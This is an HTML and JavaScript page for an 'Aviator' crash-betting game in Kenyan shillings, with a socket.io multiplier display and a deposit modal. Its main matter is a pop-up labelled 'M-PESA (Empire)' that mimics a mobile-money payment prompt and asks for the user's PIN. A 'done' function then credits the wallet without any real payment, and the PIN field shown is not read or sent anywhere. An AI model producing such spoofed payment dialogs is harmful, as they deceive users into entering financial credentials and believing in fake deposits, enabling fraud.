<!DOCTYPE html>
<html>
<head>
    <title>Aviator Live</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: white; font-family: sans-serif; margin: 0; text-align: center; }
        .top-nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; border-bottom: 1px solid #333; }
        #display { font-size: 50px; font-weight: 900; margin-top: 80px; }
        .btn { width: 90%; padding: 18px; background: #28a745; border: none; color: white; font-weight: 900; border-radius: 12px; font-size: 20px; cursor: pointer; }
        #stk { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #000; padding: 20px; border-radius: 10px; z-index: 200; width: 80%; }
        #dep-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1b1c1d; padding: 20px; border-radius: 15px; border: 1px solid #28a745; z-index: 100; }
    </style>
</head>
<body>
    <div class="top-nav"><span style="color:red; font-weight:bold;">AVIATOR</span> <span id="wallet" style="color:#28a745;">0.00 KES</span></div>
    
    <div id="dep-modal">
        <h3>Deposit to 714888</h3>
        <input type="number" id="amt" placeholder="Enter Amount" style="padding:10px; width:80%; margin-bottom:10px;">
        <button onclick="showEmpire()" style="background:#28a745; color:white; padding:10px; width:100%; border:none; border-radius:5px;">DEPOSIT</button>
    </div>

    <div id="stk">
        <b>M-PESA (Empire)</b><p>Pay KES <span id="v"></span> to 714888? Enter your PIN below.</p>
        <input type="password" placeholder="PIN" style="width:80%; padding:10px; margin-bottom:10px;">
        <button onclick="done()" style="color:blue; border:none; background:none; font-weight:bold; font-size:18px;">OK</button>
    </div>

    <div id="display">1.00x</div>
    <div id="crash-msg" style="display:none; color:red; font-weight:bold;">FLEW AWAY!</div>
    <button id="bet" class="btn" onclick="act()" style="margin-top:20px;">BET</button>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io(); let bal = 0, cur = 1.0, state = "IDLE", stake = 0;
        function act() {
            if (bal <= 0) { document.getElementById('dep-modal').style.display='block'; return; }
            state = "WAIT"; document.getElementById('bet').innerText = "WAITING...";
        }
        function showEmpire() { 
            stake = parseFloat(document.getElementById('amt').value);
            document.getElementById('dep-modal').style.display='none';
            document.getElementById('v').innerText = stake;
            document.getElementById('stk').style.display='block';
        }
        function done() { 
            bal += stake; document.getElementById('wallet').innerText = bal.toFixed(2) + " KES";
            document.getElementById('stk').style.display='none';
        }
        socket.on('tick', m => { cur = m; document.getElementById('display').innerText = m + "x"; });
        socket.on('crashed', d => { document.getElementById('crash-msg').style.display='block'; setTimeout(()=>document.getElementById('crash-msg').style.display='none', 2000); });
    </script>
</body>
</html>
